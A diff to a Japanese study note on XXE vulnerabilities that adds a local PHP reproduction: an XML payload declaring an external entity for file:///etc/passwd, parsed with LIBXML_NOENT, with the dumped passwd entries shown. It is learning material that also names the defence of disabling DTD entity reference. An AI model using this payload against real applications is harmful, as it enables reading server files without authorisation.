@@ -50,6 +50,32 @@ Hello World
 外部エンティティは`<!ENTITY xxe SYSTEM "file:///etc/passwd">`みたいに`SYSTEM`を使って実体参照を行う。   
    
 この脆弱性を防ぐにはDTD構文を使った実体参照の機能を禁止する必要があるらしい。   
+ローカルでこれを再現すると以下の通り。  
+`simplexml_load_string($_POST['data'], 'SimpleXMLExtended', LIBXML_NOCDATA);`のうち第三引数が`LIBXML_NOENT`になってないと実体参照はできないらしい。でもPHPのコンパイルオプションによっては第一引数だけで実体参照できたりすることもあるらしい。  
+https://www.php.net/manual/ja/libxml.constants.php  
+https://qiita.com/prograti/items/82409213bb875540a52e  
+```txt
+takabayashi@takabayashi-VirtualBox:/var/www/html$ php -a
+Interactive mode enabled
+
+php > $string = <<<XML
+<<< > <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<<< > <!DOCTYPE dummy [ 
+<<< > <!ELEMENT t ANY >
+<<< > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+<<< > XML;
+php >
+php > print_r(simplexml_load_string($string,'SimpleXMLElement', LIBXML_NOENT));
+SimpleXMLElement Object
+(
+    [0] => root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+// 以下略
+
+)
+php >
+```
 ## 例
 ### LFI
 XMLを解析した結果をアプリケーションが返してくれる時。   
